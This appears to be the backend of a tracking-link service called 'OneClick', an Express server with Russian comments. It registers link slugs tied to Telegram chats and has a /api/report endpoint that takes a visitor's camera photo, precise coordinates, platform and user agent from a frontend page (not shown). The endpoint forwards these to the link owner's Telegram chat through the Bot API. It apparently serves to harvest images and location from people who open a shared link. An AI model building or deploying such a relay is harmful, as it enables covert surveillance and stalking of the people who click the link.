// === server.js — OneClick API backend ===
// Простая связка: бот ↔ фронт ↔ Telegram

import express from "express";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";
import bodyParser from "body-parser";
import dotenv from "dotenv";
dotenv.config();

const PORT = process.env.PORT || 8080;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_API_SECRET = process.env.ADMIN_API_SECRET;
const LINKS_FILE = path.resolve("./links.json");

// === Хранилище ссылок (JSON-файл) ===
function loadLinks() {
  try {
    return JSON.parse(fs.readFileSync(LINKS_FILE, "utf8"));
  } catch {
    return {};
  }
}
function saveLinks(data) {
  fs.writeFileSync(LINKS_FILE, JSON.stringify(data, null, 2));
}

const links = loadLinks();

// === Telegram отправка ===
async function sendToTelegram(chatId, caption, photoBase64) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        caption,
        photo: photoBase64,
      }),
    });
    const t = await res.text();
    if (!res.ok) console.error("Telegram send error:", t);
  } catch (e) {
    console.error("Telegram send failed:", e);
  }
}

// === Express App ===
const app = express();
app.use(bodyParser.json({ limit: "20mb" }));
app.use(express.static("public")); // тут лежит index.html и app.js

// === POST /api/register-link ===
// регистрирует slug, chatId, ownerId
app.post("/api/register-link", (req, res) => {
  const auth = req.headers.authorization || "";
  if (auth !== `Bearer ${ADMIN_API_SECRET}`)
    return res.status(403).json({ error: "forbidden" });

  const { slug, chatId, ownerId } = req.body;
  if (!slug || !chatId) return res.status(400).json({ error: "missing fields" });

  if (links[slug]) return res.status(409).json({ error: "slug exists" });

  links[slug] = {
    slug,
    chatId,
    ownerId,
    createdAt: new Date().toISOString(),
  };
  saveLinks(links);
  console.log("✅ Registered link:", slug, "→ chat", chatId);
  res.json({ ok: true, slug });
});

// === GET /api/link-info?slug=... ===
// возвращает chatId для фронта
app.get("/api/link-info", (req, res) => {
  const slug = req.query.slug;
  if (!slug || !links[slug]) return res.status(404).json({ error: "not found" });
  res.json({ slug, chatId: links[slug].chatId });
});

// === POST /api/report ===
// фронт отправляет отчёт: фото, гео, device
app.post("/api/report", async (req, res) => {
  try {
    const { chatId, geo, photoBase64, platform, userAgent, note, slug } = req.body;

    const targetChatId = chatId || (slug && links[slug]?.chatId);
    if (!targetChatId) return res.status(400).json({ error: "missing chatId" });

    const caption =
      `📸 Новый отчёт\n` +
      (slug ? `🔗 Ссылка: ${slug}\n` : "") +
      (geo ? `📍 ${geo.lat?.toFixed(4)}, ${geo.lon?.toFixed(4)} (±${geo.acc}м)\n` : "") +
      (platform ? `💻 ${platform}\n` : "") +
      (note ? `📝 ${note}\n` : "");

    await sendToTelegram(targetChatId, caption, photoBase64);

    console.log(`📩 Report for chat ${targetChatId} (${slug || "no slug"})`);
    res.json({ ok: true });
  } catch (e) {
    console.error("report error", e);
    res.status(500).json({ error: e.message });
  }
});

// === healthcheck ===
app.get("/", (_, res) => res.send("✅ OneClick API server active"));

// === start ===
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
